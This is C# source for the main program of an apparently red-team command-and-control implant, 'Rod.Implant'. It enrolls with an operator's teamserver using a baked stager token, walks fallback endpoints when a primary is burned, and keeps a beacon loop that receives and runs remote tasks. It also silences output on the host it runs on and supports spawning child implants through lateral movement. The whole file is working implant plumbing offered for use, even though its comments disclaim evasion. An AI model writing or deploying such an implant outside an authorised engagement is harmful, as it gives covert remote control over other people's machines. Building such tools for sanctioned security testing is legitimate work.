// Rod.Implant is the reference .NET stage-2 implant. It enrolls
// into an engagement, opens the mTLS beacon stream, and runs the standard-
// category capability verbs the teamserver dispatches (architecture.md Sec 5,
// Sec 10.1). It is a benign reference: no evasion, no obfuscation, and no
// destructive behavior (architecture.md Sec 7); keyboard
// capture and LSASS dumping stay out-of-tree by the Sec 13 boundary. It proves
// the end-to-end slice -- enroll, beacon, task -- against the real teamserver
// and gives the .NET build unit something real to compile.

using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Rod.Implant;
using Rod.Implant.Internal;

return await ImplantApp.RunAsync(args);

internal static class ImplantApp
{
    public static async Task<int> RunAsync(string[] args)
    {
        using var cts = new CancellationTokenSource();
        Console.CancelKeyPress += (_, e) =>
        {
            e.Cancel = true;
            cts.Cancel();
        };

        // A profile baked in at build time (the generated BakedProfile class) seeds
        // the defaults; explicit flags and env still win over it, so an operator
        // can override at run time.
        BakedProfileSupport.SeedFromBaked();

        Config config;
        try
        {
            config = Config.Parse(args);
        }
        catch (ExitProgramException ex)
        {
            // ExitProgramException carries an explicit message only when there is
            // something to print beyond what Config already wrote (e.g. -h already
            // printed usage). A null message means "already reported, stay quiet".
            if (ex.Message is { Length: > 0 } msg)
                Console.Error.WriteLine("rod-implant: " + msg);
            return ex.ExitCode;
        }

        if (config.HasKillDate && DateTimeOffset.Now > config.KillDate)
        {
            Console.Error.WriteLine($"rod-implant: kill date {config.KillDate:O} has passed; refusing to run");
            return 1;
        }

        // The narration log: stderr while developing, a null sink when quiet.
        // Fatal paths below (refused enroll, dead beacon) print regardless --
        // an implant that dies silently is undebuggable -- but the running
        // implant's progress stays off the console of the host it runs on.
        var log = config.Quiet ? TextWriter.Null : Console.Error;

        // The implant owns its private key; only the public half crosses enroll
        // (architecture.md Sec 9). ECDSA P-256: first-run keygen is effectively
        // instantaneous where RSA-2048 costs ~100ms on-target, and the EC leaf
        // is the smaller certificate on the wire.
        log.WriteLine("rod-implant: generating implant keypair");
        using var privateKey = ECDsa.Create(ECCurve.NamedCurves.nistP256);

        var serverCAs = CACertLoader.LoadOptional(config.CACertPath);

        // The egress walk (architecture.md Sec 8): the primary endpoint plus the
        // baked fallbacks, shared by enroll and beacon so the entry that answers
        // enroll is the entry the first check-in dials. A dead primary walks to
        // the next entry at both stages; the enrolled leaf -- the identity the
        // listener sees -- never changes across the walk.
        var egress = EgressEndpoints.Of(config);

        Enrollment enrollment;
        try
        {
            enrollment = await EnrollWithRetryAsync(egress, config, privateKey, serverCAs, log, cts.Token);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"rod-implant: enroll: {ex.Message}");
            return 1;
        }
        log.WriteLine($"rod-implant: enrolled: implant={enrollment.ImplantId} engagement={enrollment.EngagementId}");

        // The lateral.move handler re-enrolls a child against the same enroll path,
        // naming this implant as parent (architecture.md Sec 10.1). Carry the enroll
        // inputs and the parent's own id into the beacon's handler registry so a
        // can derive a child that enrolls back. The child's stager token arrives in
        // the task arguments, not here: this implant's own token is already spent.
        // The bundle's URL is the walk's current entry -- the front that just
        // answered enroll -- so a child derived while the primary is burned
        // enrolls at a live front.
        var enroll = new EnrollBundle
        {
            Url = Config.ResolveEnrollUrl(egress.CurrentEnrollUrl, config.Transport),
            ParentId = enrollment.ImplantId,
            Profile = config.Transport,
            CAs = serverCAs,
        };

        // The check-in clients follow the egress walk's URL shape
        // (architecture.md Sec 8): a web entry -- an http(s):// beacon URL --
        // runs the envelope POST cycle on that port; a bare host:port runs
        // the mTLS gRPC stream; a quic:// entry runs the QUIC stream. Which
        // modules exist at all is the baked
        // transport selection -- a build compiles only the clients its walk
        // can dial (Sec 8, the bake-time transport trim). Every client
        // shares the replay-nonce floor (Sec 9) and, through the one enroll
        // bundle, the fronted-pivot ledger, so a run that crosses shapes
        // keeps its accepted-nonce history and its fronted children. The
        // loop re-selects whenever a client yields its run, so the walk's
        // current entry always decides.
        var nonces = new TaskNonceTracker();
        // The held-task ledger (architecture.md Sec 10.3 -- the dispatch
        // strand): the dedup and result cache behind the receive-ack arm,
        // shared the same way, so a task dispatched on one carrier and
        // redelivered on another is recognized either way.
        var held = new HeldTaskLedger();
        // The live cadence: starts at the baked sleep/jitter pair, retunable at
        // run time through the beacon.sleep verb (shared by every check-in
        // client covering this run).
        var cadence = new Cadence(config.Sleep, config.Jitter);
        var setup = new CheckInSetup(config, enrollment, enroll, egress, nonces, held, log, cadence);
        var clients = TransportSelection.CreateClients(setup);
        try
        {
            while (true)
            {
                var client = clients.FirstOrDefault(c => c.Serves(egress.CurrentBeaconUrl));
                if (client is null)
                {
                    // The walk reached an entry whose URL shape no compiled-in
                    // client carries (a single-shape bake walked onto the
                    // other shape's front). Say so and stop rather than dial
                    // the wrong client.
                    Console.Error.WriteLine(
                        $"rod-implant: no check-in client for beacon URL '{egress.CurrentBeaconUrl}'");
                    return 1;
                }
                var exit = await client.RunAsync(cts.Token);
                if (exit == CheckInExit.Terminate)
                    break;
            }
        }
        catch (OperationCanceledException)
        {
            // Clean shutdown via Ctrl-C.
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"rod-implant: beacon: {ex.Message}");
            return 1;
        }

        return 0;
    }

    // Enrolls with bounded retries: a transient failure (teamserver restarting,
    // network flap) backs off exponentially, while a definitive rejection (bad,
    // spent, or expired token, malformed response) fails immediately -- retrying
    // would not change that answer. Each retry advances the egress walk
    // (architecture.md Sec 8), so a burned primary is left behind on the first
    // failure rather than retried until the attempt budget is gone.
    private static async Task<Enrollment> EnrollWithRetryAsync(
        EgressEndpoints egress,
        Config config,
        ECDsa privateKey,
        X509Certificate2Collection? serverCAs,
        TextWriter log,
        CancellationToken cancellationToken)
    {
        const int maxAttempts = 5;
        for (var attempt = 1; ; attempt++)
        {
            // The malleable transport profile (architecture.md Sec 7) shapes each
            // attempt: the current entry's host with the profiled enroll path.
            var enrollUrl = Config.ResolveEnrollUrl(egress.CurrentEnrollUrl, config.Transport);
            // Report the machine once at the first successful attempt's enroll:
            // the teamserver records it as this implant's device identity.
            var host = HostIdentity.Capture();
            try
            {
                log.WriteLine($"rod-implant: enrolling at {enrollUrl}");
                return await C2.EnrollAsync(
                    enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, host: host,
                    killDate: config.HasKillDate ? config.KillDate.ToString("O") : null,
                    cancellationToken: cancellationToken);
            }
            catch (C2.EnrollRejectedException)
            {
                throw;
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                if (attempt == maxAttempts)
                    throw;
                log.WriteLine($"rod-implant: enroll attempt {attempt} failed: {ex.Message}; retrying");
                egress.Advance();
                try
                {
                    await Task.Delay(TimeSpan.FromSeconds(Math.Pow(2, attempt)), cancellationToken);
                }
                catch (OperationCanceledException)
                {
                    throw;
                }
            }
        }
    }
}

// Helpers split into small static classes so the top-level Program stays
// readable and each helper is independently testable. These are benign support
// code with no implant-only tradecraft.

internal static class CACertLoader
{
    // Loads an optional PEM-encoded CA bundle -- either a file path or the
    // PEM text itself (the baked profile carries the pinned CA inline) -- and
    // the implant pins it as the teamserver identity for the enroll TLS
    // connection. An empty value returns null (system roots / trust the chain
    // returned at enroll).
    public static X509Certificate2Collection? LoadOptional(string pathOrPem)
    {
        if (pathOrPem.Length == 0)
            return null;
        var collection = new X509Certificate2Collection();
        if (pathOrPem.Contains("-----BEGIN CERTIFICATE"))
            collection.ImportFromPem(pathOrPem);
        else
            collection.ImportFromPemFile(pathOrPem);
        if (collection.Count == 0)
            throw new InvalidOperationException($"no PEM certificates found in '{pathOrPem}'");
        return collection;
    }
}

internal static class Endpoints
{
    // Derives the beacon URL (host:port) from the enroll URL by stripping the
    // /implants/enroll path. Lets the operator pass a single endpoint.
    public static string BeaconUrlFromEnroll(string enrollUrl)
    {
        const string suffix = "/implants/enroll";
        var u = enrollUrl;
        if (u.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
            u = u[..^suffix.Length];
        // The integration test passes "-beacon-url 127.0.0.1:port" explicitly, so
        // this derivation only matters when the two hosts coincide.
        return u;
    }
}

internal static class BakedProfileSupport
{
    // Applies the build-time baked profile as the defaults for any config field
    // the operator did not supply via flag or env. The baked value is base64-URL
    // JSON (the build unit writes it into the generated BakedProfile class).
    // Malformed baked data is ignored -- a bad bake must not crash the implant, it
    // just falls back to flag/env.
    public static void SeedFromBaked()
    {
        var bakedJson = BakedProfile.Json;
        if (bakedJson.Length == 0)
            return;
        string raw;
        try
        {
            raw = DecodeBase64Url(bakedJson);
        }
        catch
        {
            return;
        }
        using var doc = System.Text.Json.JsonDocument.Parse(raw);
        var root = doc.RootElement;
        // Map baked keys to the same ROD_* env names config.Parse reads; only set
        // env when it is not already present, so an explicit env always wins over
        // the bake.
        SetEnvIfPresent(root, "enrollURL", "ROD_ENROLL_URL");
        SetEnvIfPresent(root, "verbs", "ROD_VERBS");
        SetEnvIfPresent(root, "mode", "ROD_MODE");
        SetEnvIfPresent(root, "degradedChannels", "ROD_DEGRADED_CHANNELS");
        SetEnvIfPresent(root, "beaconURL", "ROD_BEACON_URL");
        // The pinned teamserver CA rides as the PEM text itself; the loader
        // accepts inline PEM or a file path under the same knob.
        SetEnvIfPresent(root, "caCert", "ROD_CA_CERT");
        SetEnvIfPresent(root, "token", "ROD_STAGER_TOKEN");
        SetEnvIfPresent(root, "sleep", "ROD_SLEEP");
        SetEnvIfPresent(root, "jitter", "ROD_JITTER");
        SetEnvIfPresent(root, "killDate", "ROD_KILL_DATE");
        SetEnvIfPresent(root, "enrollPath", "ROD_ENROLL_PATH");
        SetEnvIfPresent(root, "userAgent", "ROD_USER_AGENT");
        SetEnvIfPresent(root, "requestTimeout", "ROD_REQUEST_TIMEOUT");
        SetEnvIfPresent(root, "envelope", "ROD_ENVELOPE");
        SetEnvIfPresent(root, "envelopeKey", "ROD_ENVELOPE_KEY");
        SetEnvIfPresent(root, "checkinEnvelope", "ROD_CHECKIN_ENVELOPE");
        // The pipeline bakes quiet=true for every artifact; a debugging run
        // presets ROD_QUIET=0 to override it (SetEnvIfPresent leaves an
        // already-set variable untouched).
        SetEnvIfPresent(root, "quiet", "ROD_QUIET");
        // Headers ride as a nested object; re-emit the raw JSON verbatim into
        // ROD_HEADERS, which config.Parse decodes back into the header map.
        if (root.TryGetProperty("headers", out var headers)
            && headers.ValueKind == System.Text.Json.JsonValueKind.Object
            && Environment.GetEnvironmentVariable("ROD_HEADERS") is null)
        {
            Environment.SetEnvironmentVariable("ROD_HEADERS", headers.GetRawText());
        }
        // The fallback endpoint list rides as a nested array, the same verbatim
        // pass-through (architecture.md Sec 8): ROD_FALLBACK_ENROLL_URLS decodes
        // the JSON array back into the ordered walk.
        if (root.TryGetProperty("fallbackEnrollURLs", out var fallbacks)
            && fallbacks.ValueKind == System.Text.Json.JsonValueKind.Array
            && Environment.GetEnvironmentVariable("ROD_FALLBACK_ENROLL_URLS") is null)
        {
            Environment.SetEnvironmentVariable("ROD_FALLBACK_ENROLL_URLS", fallbacks.GetRawText());
        }
    }

    private static void SetEnvIfPresent(System.Text.Json.JsonElement root, string jsonKey, string envKey)
    {
        if (root.TryGetProperty(jsonKey, out var value) && value.ValueKind == System.Text.Json.JsonValueKind.String)
        {
            var s = value.GetString();
            if (!string.IsNullOrEmpty(s) && Environment.GetEnvironmentVariable(envKey) is null)
                Environment.SetEnvironmentVariable(envKey, s);
        }
    }

    private static string DecodeBase64Url(string value)
    {
        var padded = value.Replace('-', '+').Replace('_', '/');
        padded = padded.PadRight((padded.Length + 3) & ~3, '=');
        var bytes = Convert.FromBase64String(padded);
        return System.Text.Encoding.UTF8.GetString(bytes);
    }
}
